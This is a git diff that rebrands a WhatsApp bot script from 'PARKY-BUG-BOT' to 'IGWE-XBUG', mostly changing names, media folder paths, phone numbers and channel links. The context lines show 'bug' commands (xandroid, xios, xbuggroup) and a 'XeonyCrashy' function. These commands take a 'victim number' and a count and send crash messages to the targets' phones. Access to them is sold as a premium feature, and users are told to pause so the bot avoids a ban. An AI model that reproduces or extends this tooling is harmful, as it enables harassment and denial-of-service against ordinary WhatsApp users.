@@ -63,9 +63,9 @@ const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
 const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))
 
 //time
-const xtime = moment.tz('Africa/Togo').format('HH:mm:ss')
-        const xdate = moment.tz('Africa/Togo').format('DD/MM/YYYY')
-        const time2 = moment().tz('Africa/Togo').format('HH:mm:ss')  
+const xtime = moment.tz('Africa/Gabon').format('HH:mm:ss')
+        const xdate = moment.tz('Africa/Gabon').format('DD/MM/YYYY')
+        const time2 = moment().tz('Africa/Gabon').format('HH:mm:ss')  
          if(time2 < "23:59:00"){
 var xeonytimewisher = `𝐁𝐨𝐧𝐧𝐞 𝐧𝐮𝐢𝐭 `
  }
@@ -157,7 +157,7 @@ isForwarded: true,
 "body": `${ownername}`,
 "previewType": "PHOTO",
 "thumbnailUrl": ``,
-"thumbnail": fs.readFileSync(`./parkyMedia/thumb.jpg`),
+"thumbnail": fs.readFileSync(`./IgweMedia/thumb.jpg`),
 "sourceUrl": `${link}`}}},
 { quoted: m})
 }
@@ -476,7 +476,7 @@ const subscribe_dgxeon = {
 },
 message: {
 "listResponseMessage": {
-title: `Xeon's ur father`
+title: `igwe's ur father`
 }}
 }
 async function XeonyCrashy(dgxeon,chat) {
@@ -568,25 +568,25 @@ list.push({
         
 for (let BhosdikaXeon of VoiceNoteXeon) {
 if (budy === BhosdikaXeon) {
-let audiobuffy = fs.readFileSync(`./parkyMedia/audio/${BhosdikaXeon}.mp3`)
+let audiobuffy = fs.readFileSync(`./IgweMedia/audio/${BhosdikaXeon}.mp3`)
 XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 }
 }
 for (let BhosdikaXeon of StickerXeon){
 if (budy === BhosdikaXeon){
-let stickerbuffy = fs.readFileSync(`./parkyMedia/sticker/${BhosdikaXeon}.webp`)
+let stickerbuffy = fs.readFileSync(`./IgweMedia/sticker/${BhosdikaXeon}.webp`)
 XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
 }
 }
 for (let BhosdikaXeon of ImageXeon){
 if (budy === BhosdikaXeon){
-let imagebuffy = fs.readFileSync(`./parkyMedia/image/${BhosdikaXeon}.jpg`)
+let imagebuffy = fs.readFileSync(`./IgweMedia/image/${BhosdikaXeon}.jpg`)
 XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
 }
 }
 for (let BhosdikaXeon of VideoXeon){
 if (budy === BhosdikaXeon){
-let videobuffy = fs.readFileSync(`./parkyMedia/video/${BhosdikaXeon}.mp4`)
+let videobuffy = fs.readFileSync(`./IgweMedia/video/${BhosdikaXeon}.mp4`)
 XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
 }
 }
@@ -596,7 +596,7 @@ XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.androi
 }
 for (let BhosdikaXeon of ApkXeon) {
 if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./parkyMedia/apk/${BhosdikaXeon}.apk`)
+let buffer = fs.readFileSync(`./IgweMedia/apk/${BhosdikaXeon}.apk`)
 sendapk(buffer)
 }
 }
@@ -606,7 +606,7 @@ XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {qu
 }
 for (let BhosdikaXeon of ZipXeon) {
 if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./parkyMedia/zip/${BhosdikaXeon}.zip`)
+let buffer = fs.readFileSync(`./IgweMedia/zip/${BhosdikaXeon}.zip`)
 sendzip(buffer)
 }
 }
@@ -616,7 +616,7 @@ haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted
 }
 for (let BhosdikaXeon of DocXeon) {
 if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./parkyMedia/doc/${BhosdikaXeon}.pdf`)
+let buffer = fs.readFileSync(`./IgweMedia/doc/${BhosdikaXeon}.pdf`)
 senddocu(buffer)
 }
 }
@@ -743,7 +743,7 @@ senddocu(buffer)
                 break
             case 'shutdown':
                 if (!isCreator) return replygcxeon(mess.owner)
-                replygcxeon(`*Goodbye 👋*`)
+                replygcxeon(`*Aloha 👋*`)
                 await sleep(3000)
                 process.exit()
                 break
@@ -888,7 +888,7 @@ senddocu(buffer)
             case 'leave':
                 if (!isCreator) return replygcxeon(mess.owner)
                 if (!m.isGroup) return replygcxeon(mess.group)
-                replygcxeon('*Bye Everyone 👋🩵*')
+                replygcxeon('*Bye Everyone 👋*')
                 await XeonBotInc.groupLeave(m.chat)
                 break
             case 'backup':
@@ -915,7 +915,7 @@ senddocu(buffer)
                 replygcxeon(`*Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second*`)
                 for (let i of anu) {
                     await sleep(1500)
-                    let a = '🩵' + `\n\n${text}\n\n` + '' + '\n\n\n> 𝙹𝚎𝚊𝚗 𝙿𝚊𝚛𝚔𝚎𝚛'
+                    let a = '🌚' + `\n\n${text}\n\n` + '' + '\n\n\n> PAPAIGWE'
                     XeonBotInc.sendMessage(i, {
                         text: a,
                         contextInfo: {
@@ -937,7 +937,7 @@ senddocu(buffer)
             case 'getcase':
                 if (!isCreator) return replygcxeon(mess.owner)
                 const getCase = (cases) => {
-                    return "case" + `'${cases}'` + fs.readFileSync("PARKY-BUG-BOT.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
+                    return "case" + `'${cases}'` + fs.readFileSync("IGWE-BUG-BOT.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                 }
                 replygcxeon(`${getCase(q)}`)
                 break
@@ -1096,11 +1096,11 @@ senddocu(buffer)
                 if (!m.isGroup) return replygcxeon(mess.group)
                 if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
-                let teks = `*👨‍👩‍👧‍👦🩵 Tag All*
+                let teks = `*👑tag all👑*
  
                  👻¸🗨️ *Message : ${q ? q : ''}*\n\n`
                 for (let mem of participants) {
-                    teks += `🩵 @${mem.id.split('@')[0]}\n`
+                    teks += `🦠 @${mem.id.split('@')[0]}\n`
                 }
                 XeonBotInc.sendMessage(m.chat, {
                     text: teks,
@@ -1229,7 +1229,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `YouTube Jean-parker-tech`,
+                            title: `YouTube IGWE-tech`,
                             body: `${latensi.toFixed(4)} Second`,
                             thumbnailUrl: 'https://telegra.ph/file/e5455ce7415bc9ab0068c.jpg',
                             sourceUrl: global.link,
@@ -1245,7 +1245,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'buypremium':
             case 'buyprem':
             case 'premium': {
-                let teks = `*Salut ${pushname}\n Premium est payant ! \n Met ton numéro dans Premium json file! \n et dépôt à Jean parker pour l'activer on Youtube channel Jean-parker-tech*`
+                let teks = `*Salut ${pushname}\n Premium est payant ! \n Met ton numéro dans Premium json file! \n et dépôt à PAPA IGWE pour l'activer on *`
                 await XeonBotInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
@@ -1271,8 +1271,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `Yt Jean-parker-tech`,
-                            body: `Love from Jean Parker 🩵`,
+                            title: `Yt IGWE-tech`,
+                            body: `Love from Papa igwe 🩵`,
                             thumbnailUrl: 'https://telegra.ph/file/e5455ce7415bc9ab0068c.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
@@ -1287,11 +1287,11 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'script':
             case 'scriptbot':
                 XeonBotInc.sendMessage(m.chat, {
-                    text: `🌐 *_Git:_* https://github.com/Jeanparker100/PARKY-BUG-BOT\n\n🪀 *_Group:_* https://chat.whatsapp.com/L8NDXnqqDZn2uEtzsgZ8ES\n\n🪀 *_Channel:_* https://whatsapp.com/channel/0029VagLiHaEVccM6o6Sqc45\n\n🩵 *_Dev:_* https://Wa.me//+22898133388`,
+                    text: `🌐 *_Git:_* https://github.com/PAPAIGWE241/IGWE-XBUG\n\n🪀 *_Channel:_* https://whatsapp.com/channel/0029VaoRh0h2UPBAyRobHB2t\n\n🩵 *_Dev:_* https://Wa.me//+24160338758`,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `SCRIPT OF Parky-MD is on YouTube Jean-parker-tech 🩵`,
+                            title: `SCRIPT OF 𝕀𝔾𝕎𝔼-𝕏𝔹𝕌𝔾 join the channel bruh🫵😑`,
                             body: `Love You bro 🩵`,
                             thumbnailUrl: 'https://telegra.ph/file/e5455ce7415bc9ab0068c.jpg',
                             sourceUrl: global.link,
@@ -1307,7 +1307,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'donasi':
                 let textnate = `*Bonjour ${pushname}*\n\n *Quelques soit comment c'est petit c'est l'intention qui compte*  \n *Flooz :* +22898133388`
                 XeonBotInc.sendMessage(m.chat, {
-                    text: '*Don de soutien pour Jean Parker*\n\n' + textnate
+                    text: '*Don de soutien pour PAPA IGWE*\n\n' + textnate
                 }, {
                     quoted: m
                 })
@@ -1649,7 +1649,7 @@ break
                 let wanu = VideoXeon.indexOf(q)
                 VideoXeon.splice(wanu, 1)
                 fs.writeFileSync('./database/autoreply/video.json', JSON.stringify(VideoXeon))
-                fs.unlinkSync(`./parkyMedia/video/${q}.mp4`)
+                fs.unlinkSync(`./IgweMedia/video/${q}.mp4`)
                 replygcxeon(`Successfully Deleted Video ${q}`)
             }
             break
@@ -1659,7 +1659,7 @@ break
                 if (ImageXeon.includes(q)) return replygcxeon("The name you entered is already registered in the database")
                 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                 ImageXeon.push(q)
-                await fsx.copy(delb, `./parkyMedia/image/${q}.jpg`)
+                await fsx.copy(delb, `./IgweMedia/image/${q}.jpg`)
                 fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
                 fs.unlinkSync(delb)
                 replygcxeon(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
@@ -1672,7 +1672,7 @@ break
                 let wanu = ImageXeon.indexOf(q)
                 ImageXeon.splice(wanu, 1)
                 fs.writeFileSync('./database/autoreply/image.json', JSON.stringify(ImageXeon))
-                fs.unlinkSync(`./parkyMedia/image/${q}.jpg`)
+                fs.unlinkSync(`./IgweMedia/image/${q}.jpg`)
                 replygcxeon(`Successfully Deleted Image ${q}`)
             }
             break
@@ -1682,7 +1682,7 @@ break
                 if (StickerXeon.includes(q)) return replygcxeon("Name Already In Use")
                 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                 StickerXeon.push(q)
-                await fsx.copy(delb, `./parkyMedia/sticker/${q}.webp`)
+                await fsx.copy(delb, `./IgweMedia/sticker/${q}.webp`)
                 fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                 fs.unlinkSync(delb)
                 replygcxeon(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
@@ -1695,7 +1695,7 @@ break
                 let wanu = StickerXeon.indexOf(q)
                 StickerXeonBotInc.splice(wanu, 1)
                 fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
-                fs.unlinkSync(`./parkyMedia/sticker/${q}.webp`)
+                fs.unlinkSync(`./IgweMedia/sticker/${q}.webp`)
                 replygcxeon(`Successfully Removed Sticker ${q}`)
             }
             break
@@ -1705,7 +1705,7 @@ break
                 if (VoiceNoteXeon.includes(q)) return replygcxeon("Name Already In Use")
                 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                 VoiceNoteXeon.push(q)
-                await fsx.copy(delb, `./parkyMedia/audio/${q}.mp3`)
+                await fsx.copy(delb, `./IgweMedia/audio/${q}.mp3`)
                 fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                 fs.unlinkSync(delb)
                 replygcxeon(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
@@ -1718,7 +1718,7 @@ break
                 let wanu = VoiceNoteXeon.indexOf(q)
                 VoiceNoteXeon.splice(wanu, 1)
                 fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
-                fs.unlinkSync(`./parkyMedia/audio/${q}.mp3`)
+                fs.unlinkSync(`./IgweMedia/audio/${q}.mp3`)
                 replygcxeon(`Successfully Deleted Audio ${q}`)
             }
             break
@@ -1731,7 +1731,7 @@ let teks = `${text}`
 if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 ZipXeon.push(teks)
-await fsx.copy(delb, `./parkyMedia/zip/${teks}.zip`)
+await fsx.copy(delb, `./IgweMedia/zip/${teks}.zip`)
 fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
 fs.unlinkSync(delb)
 replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
@@ -1748,7 +1748,7 @@ if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the
 let wanu = ZipXeon.indexOf(teks)
 ZipXeon.splice(wanu, 1)
 fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
-fs.unlinkSync(`./parkyMedia/zip/${teks}.zip`)
+fs.unlinkSync(`./IgweMedia/zip/${teks}.zip`)
 replygcxeon(`Successfully deleted zip ${teks}`)
 }
 }
@@ -1772,7 +1772,7 @@ let teks = `${text}`
 if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 apknye.push(teks)
-await fsx.copy(delb, `./parkyMedia/apk/${teks}.apk`)
+await fsx.copy(delb, `./IgweMedia/apk/${teks}.apk`)
 fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
 fs.unlinkSync(delb)
 replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
@@ -1789,7 +1789,7 @@ if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the
 let wanu = ApkXeon.indexOf(teks)
 ApkXeon.splice(wanu, 1)
 fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
-fs.unlinkSync(`./parkyMedia/apk/${teks}.apk`)
+fs.unlinkSync(`./IgweMedia/apk/${teks}.apk`)
 replygcxeon(`Successfully deleted Apk ${teks}`)
 }
 }
@@ -1813,7 +1813,7 @@ let teks = `${text}`
 if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
 let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
 docunye.push(teks)
-await fsx.copy(delb, `./parkyMedia/doc/${teks}.pdf`)
+await fsx.copy(delb, `./IgweMedia/doc/${teks}.pdf`)
 fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
 fs.unlinkSync(delb)
 replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
@@ -1830,7 +1830,7 @@ if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the
 let wanu = DocApk.indexOf(teks)
 docunye.splice(wanu, 1)
 fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
-fs.unlinkSync(`./parkyMedia/doc/${teks}.pdf`)
+fs.unlinkSync(`./IgweMedia/doc/${teks}.pdf`)
 replygcxeon(`Successfully deleted pdf ${teks}`)
 }
 }
@@ -2077,7 +2077,7 @@ await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/m
 break
 
 //bug cases
-case "xandroid": {
+case "xigweandroid": {
   if (!isPremium) return replygcxeon(mess.prem)
   if (!text) return replygcxeon(`*Use ${prefix+command} victim number|amount*\n*Example ${prefix+command} 228xxxxxxxx,5*`) 
   let number = text.split(',')[0];
@@ -2104,12 +2104,12 @@ case "xandroid": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "*Successfully Sent Amaterasu 👀🔥 To @" + whatsappNumber.split('@')[0] + 
-    " Using " + command + "* \n\n*Pause 2 minutes so that the bot is not banned.*\n\n> 𝙹𝚎𝚊𝚗 𝙿𝚊𝚛𝚔𝚎𝚛 ©", 
+    " Using " + command + "* \n\n*Pause 2 minutes so that the bot is not banned.*\n\n> igwe tech ©", 
     [whatsappNumber]
   );
 }
 break;
-case "xios": {
+case "xigweios": {
   if (!isPremium) return replygcxeon(mess.prem)
   if (!text) return replygcxeon(`*Use ${prefix+command} victim number|amount*\n*Example ${prefix+command} 228xxxxxxxx,5*`) 
   let number = text.split(',')[0];
@@ -2136,7 +2136,7 @@ case "xios": {
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "*Kamehameha 🌀 Sent To @" + whatsappNumber.split('@')[0] + 
-    " Using " + command + "*\n\n*Pause 2 minutes so that the bot is not banned.*\n\n> 𝙹𝚎𝚊𝚗 𝙿𝚊𝚛𝚔𝚎𝚛 ©", 
+    " Using " + command + "*\n\n*Pause 2 minutes so that the bot is not banned.*\n\n> igwe tech ©", 
     [whatsappNumber]
   );
 }
@@ -2161,7 +2161,7 @@ case "xios2":
     sendReaction('🩵');
   }
   break;
-  case "xandroid2":
+  case "xigweandroid2":
   {
 	if (!isPremium) return replygcxeon(mess.prem)
     if (!isBot) {
@@ -2181,7 +2181,7 @@ case "xios2":
     sendReaction('🩵');
   }
   break;
-  case "xgc":
+  case "xbuggroup":
   {
     if (!isPremium) return replygcxeon(mess.prem)
     if (!text) {
@@ -2220,7 +2220,7 @@ case "xios2":
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "919012008456") {
+  if (cleanedNumber == "24160338758") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2232,7 +2232,7 @@ case "xios2":
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
     "*Successfully Sent Bankai -Senbonzakura kageyoshi ⚔️ To @" + whatsappNumber.split('@')[0] + 
-    " Using " + command + "* \n\n*Pause 2 minutes so that the bot is not banned.*\n\n> 𝙹𝚎𝚊𝚗 𝙿𝚊𝚛𝚔𝚎𝚛 ©", 
+    " Using " + command + "* \n\n*Pause 2 minutes so that the bot is not banned.*\n\n> igwe tech ©", 
     [whatsappNumber]
   );
 }
@@ -2290,7 +2290,7 @@ break
 ┃❃│ Prefix : [ ]
 ┃❃│ User :  ${pushname}
 ┃❃│ Time : ${xeonytimewisher}
-┃❃│ Day : Regarde sur la montre
+┃❃│ Day : ta une montre ?
 ┃❃│ Date : le calendrier est là !
 ┃❃│ Version : 1.0
 ┃❃│ Plugins : 250
@@ -2298,7 +2298,7 @@ break
 ┃❃│ Alive : ${runtime(process.uptime())}
 ┃❃╰───────────────
 ╰═════════════════⊷
-
+𝕀𝔾𝕎𝔼       🦠         𝕏𝔹𝕌𝔾
 ╭═══ 𝙰𝙽𝙳𝚁𝙾𝙸𝙳  𝙱𝚄𝙶 ⚠️ ═══⊷ 
 ┃ 🩵 𝙭𝚊𝙣𝙙𝚛𝙤𝙞𝙙
 ┃ 🩵 𝙭𝚊𝙣𝙙𝚛𝙤𝙞𝙙2
@@ -2414,7 +2414,7 @@ break
 ┃ 🩵 sᴏᴜɴᴅ1 - sᴏᴜɴᴅ161
 ╰═════════════════⊷
 
-> 𝙹𝚎𝚊𝚗 𝙿𝚊𝚛𝚔𝚎𝚛 ©`
+> igwe team  in©`
 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
                         text: xeonmenuoh,
@@ -2433,7 +2433,7 @@ if (typemenu === 'v1') {
                     })
                     } else if (typemenu === 'v2') {
                     XeonBotInc.sendMessage(m.chat, {
-      video: fs.readFileSync('./parkyMedia/thumb2.mp4'),
+      video: fs.readFileSync('./IgweMedia/thumb2.mp4'),
       gifPlayback: true,
       caption: xeonmenuoh,
       contextInfo: {
@@ -2451,7 +2451,7 @@ if (typemenu === 'v1') {
                     })
                 } else if (typemenu === 'v3') {
                     XeonBotInc.sendMessage(m.chat, {
-                        video: fs.readFileSync('./parkyMedia/thumb2.mp4'),
+                        video: fs.readFileSync('./IgweMedia/thumb2.mp4'),
                         caption: xeonmenuoh,
                         gifPlayback: true
                     }, {
